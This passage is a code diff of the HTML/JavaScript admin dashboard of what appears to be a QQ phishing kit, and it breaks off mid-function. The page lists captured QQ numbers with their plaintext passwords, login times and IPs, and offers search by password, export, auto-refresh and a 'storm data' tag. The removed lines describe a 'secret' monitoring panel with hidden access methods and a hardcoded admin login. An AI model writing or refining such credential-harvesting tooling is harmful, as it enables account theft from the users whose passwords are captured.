@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QQ管理系统</title>
+    <title>QQ数据管理后台</title>
     <style>
         * {
             margin: 0;
@@ -13,70 +13,63 @@
         }
         
         body {
-            background-color: #1a1a1a;
-            color: #fff;
-            min-height: 100vh;
+            background: #f5f5f5;
+            padding: 20px;
         }
         
-        .secret-admin {
-            padding: 20px;
+        .admin-container {
             max-width: 1200px;
             margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
         
         .admin-header {
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
+            background: linear-gradient(45deg, #2c3e50, #34495e);
+            color: white;
+            padding: 30px;
             text-align: center;
         }
         
         .admin-header h1 {
-            font-size: 24px;
+            font-size: 28px;
             margin-bottom: 10px;
         }
         
-        .admin-header p {
-            opacity: 0.8;
-            font-size: 14px;
-        }
-        
-        .stats-grid {
+        .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 20px;
+            gap: 20px;
+            padding: 20px;
+            background: #f8f9fa;
         }
         
         .stat-card {
-            background: #2d2d2d;
+            background: white;
             padding: 20px;
             border-radius: 8px;
             text-align: center;
-            border-left: 4px solid #ff6b6b;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
         
-        .stat-card h3 {
-            font-size: 14px;
-            opacity: 0.7;
-            margin-bottom: 10px;
-        }
-        
-        .stat-value {
-            font-size: 24px;
+        .stat-number {
+            font-size: 32px;
             font-weight: bold;
-            color: #ff6b6b;
+            color: #2c3e50;
+            margin-bottom: 5px;
         }
         
-        .control-panel {
-            background: #2d2d2d;
+        .stat-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .controls {
             padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        
-        .control-buttons {
+            background: #f8f9fa;
+            border-bottom: 1px solid #eee;
             display: flex;
             gap: 10px;
             flex-wrap: wrap;
@@ -91,275 +84,215 @@
             transition: all 0.3s;
         }
         
-        .btn-primary {
-            background: #ff6b6b;
-            color: white;
-        }
-        
-        .btn-success {
-            background: #1dd1a1;
-            color: white;
-        }
-        
-        .btn-danger {
-            background: #ff9ff3;
-            color: white;
-        }
+        .btn-primary { background: #3498db; color: white; }
+        .btn-success { background: #27ae60; color: white; }
+        .btn-danger { background: #e74c3c; color: white; }
+        .btn-warning { background: #f39c12; color: white; }
         
         .btn:hover {
-            opacity: 0.8;
             transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .search-box {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
         }
         
         .data-table {
-            background: #2d2d2d;
-            border-radius: 8px;
-            overflow: hidden;
+            overflow-x: auto;
         }
         
-        .table-header {
-            background: #ff6b6b;
-            padding: 15px;
-            font-weight: bold;
+        table {
+            width: 100%;
+            border-collapse: collapse;
         }
         
-        .table-row {
-            display: grid;
-            grid-template-columns: 80px 1fr 1fr 1.5fr 1.5fr;
+        th, td {
             padding: 12px 15px;
-            border-bottom: 1px solid #3d3d3d;
-            align-items: center;
+            text-align: left;
+            border-bottom: 1px solid #eee;
         }
         
-        .table-row.header {
-            background: #3d3d3d;
-            font-weight: bold;
+        th {
+            background: #f8f9fa;
+            font-weight: 600;
+            color: #2c3e50;
         }
         
-        .no-data {
-            text-align: center;
-            padding: 40px;
-            opacity: 0.5;
+        tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .storm-data {
+            background: #fff3cd !important;
         }
         
         .pagination {
+            padding: 20px;
+            text-align: center;
             display: flex;
             justify-content: center;
-            padding: 15px;
             gap: 10px;
         }
         
-        .page-btn {
-            padding: 8px 15px;
-            background: #3d3d3d;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
+        .back-link {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #eee;
         }
         
-        .page-btn.active {
-            background: #ff6b6b;
-        }
-        
-        .secret-info {
-            background: #1a1a1a;
-            border: 1px solid #ff6b6b;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            font-size: 12px;
-            opacity: 0.7;
+        .back-link a {
+            color: #3498db;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
-    <div class="secret-admin">
+    <div class="admin-container">
         <div class="admin-header">
-            <h1>🔒 QQ秘密管理系统</h1>
-            <p>监控所有登录数据 - 仅管理员可见</p>
+            <h1>QQ数据管理后台</h1>
+            <p>实时监控所有登录记录和数据统计</p>
         </div>
         
-        <div class="stats-grid">
+        <div class="stats">
             <div class="stat-card">
-                <h3>总记录数</h3>
-                <div class="stat-value" id="totalRecords">0</div>
+                <div class="stat-number" id="totalRecords">0</div>
+                <div class="stat-label">总记录数</div>
             </div>
             <div class="stat-card">
-                <h3>今日记录</h3>
-                <div class="stat-value" id="todayRecords">0</div>
+                <div class="stat-number" id="todayRecords">0</div>
+                <div class="stat-label">今日登录</div>
             </div>
             <div class="stat-card">
-                <h3>独立用户</h3>
-                <div class="stat-value" id="uniqueUsers">0</div>
+                <div class="stat-number" id="stormRecords">0</div>
+                <div class="stat-label">风暴数据</div>
             </div>
             <div class="stat-card">
-                <h3>最后更新</h3>
-                <div class="stat-value" id="lastUpdate">-</div>
+                <div class="stat-number" id="uniqueIPs">0</div>
+                <div class="stat-label">独立IP</div>
             </div>
         </div>
         
-        <div class="control-panel">
-            <div class="control-buttons">
-                <button class="btn btn-primary" id="refreshBtn">🔄 刷新数据</button>
-                <button class="btn btn-success" id="exportBtn">💾 导出数据</button>
-                <button class="btn btn-danger" id="clearBtn">🗑️ 清空数据</button>
-                <button class="btn" onclick="window.location.href='login.html'" style="background: #576574; color: white;">← 返回登录页</button>
-            </div>
+        <div class="controls">
+            <input type="text" class="search-box" id="searchInput" placeholder="搜索QQ号、密码或IP..." oninput="filterData()">
+            <button class="btn btn-primary" onclick="refreshData()">🔄 刷新数据</button>
+            <button class="btn btn-success" onclick="exportData()">💾 导出数据</button>
+            <button class="btn btn-danger" onclick="clearData()">🗑️ 清空数据</button>
+            <button class="btn btn-warning" onclick="generateSampleData()">⚡ 生成测试数据</button>
         </div>
         
         <div class="data-table">
-            <div class="table-header">📊 登录记录监控</div>
-            <div class="table-row header">
-                <div>ID</div>
-                <div>QQ号</div>
-                <div>密码</div>
-                <div>登录时间</div>
-                <div>IP地址</div>
-            </div>
-            <div id="dataTableBody">
-                <div class="no-data">暂无数据<br>等待用户登录...</div>
-            </div>
-            <div class="pagination">
-                <button class="page-btn" id="prevPage">上一页</button>
-                <span id="pageInfo">第 1 页 / 共 1 页</span>
-                <button class="page-btn" id="nextPage">下一页</button>
-            </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>QQ号</th>
+                        <th>密码</th>
+                        <th>登录时间</th>
+                        <th>IP地址</th>
+                        <th>类型</th>
+                    </tr>
+                </thead>
+                <tbody id="dataBody">
+                    <tr>
+                        <td colspan="6" style="text-align: center; padding: 40px;">加载中...</td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
         
-        <div class="secret-info">
-            <strong>秘密访问方式：</strong><br>
-            1. 在登录页连续按：Q Q 1 2 3<br>
-            2. 使用管理员账号：888888 / admin888<br>
-            3. 直接访问此页面：admin_secret_2024.html
+        <div class="pagination">
+            <button class="btn" onclick="prevPage()">上一页</button>
+            <span id="pageInfo">第 1 页</span>
+            <button class="btn" onclick="nextPage()">下一页</button>
+        </div>
+        
+        <div class="back-link">
+            <a href="index.html">← 返回QQ登录页面</a>
         </div>
     </div>
 
     <script>
-        let loginData = [];
+        let allData = [];
+        let filteredData = [];
         let currentPage = 1;
-        const recordsPerPage = 8;
-
+        const pageSize = 50;
+        
+        // 初始化
         document.addEventListener('DOMContentLoaded', function() {
             loadData();
-            updateStats();
-            renderTable();
-            
-            document.getElementById('refreshBtn').addEventListener('click', refreshData);
-            document.getElementById('exportBtn').addEventListener('click', exportData);
-            document.getElementById('clearBtn').addEventListener('click', clearData);
-            document.getElementById('prevPage').addEventListener('click', prevPage);
-            document.getElementById('nextPage').addEventListener('click', nextPage);
-            
-            // 每10秒自动刷新一次
-            setInterval(refreshData, 10000);
+            setInterval(refreshData, 2000); // 每2秒自动刷新
         });
-
+        
         function loadData() {
-            loginData = JSON.parse(localStorage.getItem('qqLoginData')) || [];
-        }
-
-        function refreshData() {
-            loadData();
-            updateStats();
-            renderTable();
-        }
-
-        function exportData() {
-            if (loginData.length === 0) {
-                alert('没有数据可导出');
-                return;
-            }
-            
-            const dataStr = JSON.stringify(loginData, null, 2);
-            const blob = new Blob([dataStr], {type: 'application/json'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `qq_secret_data_${new Date().getTime()}.json`;
-            a.click();
-            URL.revokeObjectURL(url);
-            
-            alert('数据已导出！');
-        }
-
-        function clearData() {
-            if (confirm('⚠️ 确定要清空所有数据吗？此操作不可恢复！')) {
-                loginData = [];
-                localStorage.setItem('qqLoginData', JSON.stringify(loginData));
+            try {
+                allData = JSON.parse(localStorage.getItem('qq_login_records') || '[]');
+                filteredData = [...allData];
                 updateStats();
                 renderTable();
-                alert('数据已清空！');
+            } catch (error) {
+                console.error('加载数据失败:', error);
             }
         }
-
-        function prevPage() {
-            if (currentPage > 1) {
-                currentPage--;
-                renderTable();
-            }
-        }
-
-        function nextPage() {
-            const totalPages = Math.ceil(loginData.length / recordsPerPage);
-            if (currentPage < totalPages) {
-                currentPage++;
-                renderTable();
-            }
-        }
-
+        
         function updateStats() {
-            document.getElementById('totalRecords').textContent = loginData.length;
+            document.getElementById('totalRecords').textContent = allData.length.toLocaleString();
             
-            const today = new Date().toLocaleDateString();
-            const todayRecords = loginData.filter(record => {
-                return new Date(record.loginTime).toLocaleDateString() === today;
-            }).length;
-            document.getElementById('todayRecords').textContent = todayRecords;
+            // 今日记录
+            const today = new Date().toDateString();
+            const todayCount = allData.filter(item => 
+                new Date(item.loginTime).toDateString() === today
+            ).length;
+            document.getElementById('todayRecords').textContent = todayCount.toLocaleString();
             
-            const uniqueUsers = new Set(loginData.map(record => record.qqNumber)).size;
-            document.getElementById('uniqueUsers').textContent = uniqueUsers;
+            // 风暴数据
+            const stormCount = allData.filter(item => item.type === 'storm').length;
+            document.getElementById('stormRecords').textContent = stormCount.toLocaleString();
             
-            if (loginData.length > 0) {
-                const lastRecord = loginData[loginData.length - 1];
-                document.getElementById('lastUpdate').textContent = 
-                    lastRecord.loginTime.split(' ')[1]; // 只显示时间部分
-            } else {
-                document.getElementById('lastUpdate').textContent = '-';
-            }
+            // 独立IP
+            const uniqueIPs = new Set(allData.map(item => item.ip)).size;
+            document.getElementById('uniqueIPs').textContent = uniqueIPs.toLocaleString();
         }
-
+        
         function renderTable() {
-            const tableBody = document.getElementById('dataTableBody');
-            const totalPages = Math.ceil(loginData.length / recordsPerPage) || 1;
+            const startIndex = (currentPage - 1) * pageSize;
+            const endIndex = startIndex + pageSize;
+            const pageData = filteredData.slice(startIndex, endIndex);
+            const tbody = document.getElementById('dataBody');
             
-            document.getElementById('pageInfo').textContent = 
-                `第 ${currentPage} 页 / 共 ${totalPages} 页`;
-            
-            if (loginData.length === 0) {
-                tableBody.innerHTML = '<div class="no-data">暂无数据<br>等待用户登录...</div>';
+            if (pageData.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 40px;">暂无数据</td></tr>';
                 return;
             }
             
-            const startIndex = (currentPage - 1) * recordsPerPage;
-            const endIndex = Math.min(startIndex + recordsPerPage, loginData.length);
-            const pageData = loginData.slice(startIndex, endIndex);
-            
-            let tableHTML = '';
-            pageData.forEach(record => {
-                tableHTML += `
-                    <div class="table-row">
-                        <div>${record.id}</div>
-                        <div>${record.qqNumber}</div>
-                        <div>${record.password}</div>
-                        <div>${record.loginTime}</div>
-                        <div>${record.ip}</div>
-                    </div>
+            let html = '';
+            pageData.forEach((item, index) => {
+                const globalIndex = startIndex + index + 1;
+                const isStorm = item.type === 'storm';
+                const rowClass = isStorm ? 'storm-data' : '';
+                
+                html += `
+                    <tr class="${rowClass}">
+                        <td>${globalIndex}</td>
+                        <td>${item.qqNumber}</td>
+                        <td>${item.password}</td>
+                        <td>${new Date(item.loginTime).toLocaleString('zh-CN')}</td>
+                        <td>${item.ip}</td>
+                        <td>${isStorm ? '⚡风暴' : '正常'}</td>
+                    </tr>
                 `;
             });
             
-            tableBody.innerHTML = tableHTML;
+            tbody.innerHTML = html;
+            document.getElementById('pageInfo').textContent = 
+                `第 ${currentPage} 页 / 共 ${Math.ceil(filteredData.length / pageSize)} 页`;
         }
-    </script>
-</body>
-</html>
+        
+        function filterData() {
+            const keyword = document.getElementById('searchInput').value.toLowerCase();
+            
+           
